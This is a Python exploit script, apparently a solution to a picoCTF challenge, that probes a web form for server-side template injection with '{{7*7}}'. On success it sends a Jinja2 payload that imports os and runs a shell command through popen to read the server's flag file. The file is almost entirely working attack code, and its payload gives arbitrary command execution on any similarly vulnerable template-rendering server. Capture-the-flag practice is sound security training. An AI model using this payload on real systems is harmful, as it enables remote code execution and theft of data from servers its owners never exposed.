#!/usr/bin/env python3

import requests
import sys

# Ensure full argument (host:port or URL) is passed
if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <url or host:port>")
    sys.exit(1)

url = sys.argv[1].strip()

# If it's just host:port, add http:// in front
if not url.startswith("http://") and not url.startswith("https://"):
    url = "http://" + url

# Add path if needed
if url.endswith("/"):
    url += ""
elif ":" in url and "/" not in url.split(":")[-1]:
    url += "/"

# Now send the request
try:
    payload = {
        "content": "{{7*7}}"  
    }

    response = requests.post(url, data=payload)

    result = response.text


    if "49" in result:

        print("SSTI Injection success")
        print("Now we will extract the flag")
        
        flag_payload = {
            "content": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /challenge/flag').read() }}"
        }
        flag_respone = requests.post(url,data=flag_payload)

        flag_reslut = flag_respone.text


        if "pico" in flag_reslut:

            start = flag_reslut.index("picoCTF{")

            end = flag_reslut.index("}",start) + 1

            flag = flag_reslut[start:end]
            
            print(f"Here is your flag : {flag}")
    else:
        print("False")
except requests.exceptions.RequestException as e:
    print(" Error during request:", e)
